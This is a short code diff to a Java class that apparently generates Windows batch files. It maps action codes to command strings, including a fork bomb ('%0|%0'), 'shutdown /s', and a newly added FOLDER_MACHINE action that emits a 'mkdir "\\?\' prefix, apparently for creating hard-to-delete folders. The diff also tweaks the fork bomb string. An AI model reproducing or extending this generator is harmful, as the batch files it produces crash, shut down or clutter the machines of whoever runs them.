@@ -45,6 +45,8 @@ public class Feature {
                 return Action.CLEAR_SCREEN;
             case 15:
                 return Action.RUN_LINE;
+            case 16:
+                return Action.FOLDER_MACHINE;
             default:
                 return Action.NULL;
         }
@@ -70,7 +72,7 @@ public class Feature {
             case PAUSE:
                 return "pause >nul";
             case FORK_BOMB:
-                return "start %0\r\n%0|%0";
+                return "start %0 \r\n%0|%0";
             case SHUTDOWN:
                 return "shutdown /s ";
             case RESTART:
@@ -83,6 +85,8 @@ public class Feature {
                 return "cls";
             case RUN_LINE:
                 return "";
+            case FOLDER_MACHINE:
+                return "mkdir \"\\\\?\\";
             default:
                 return "@rem ";
         }
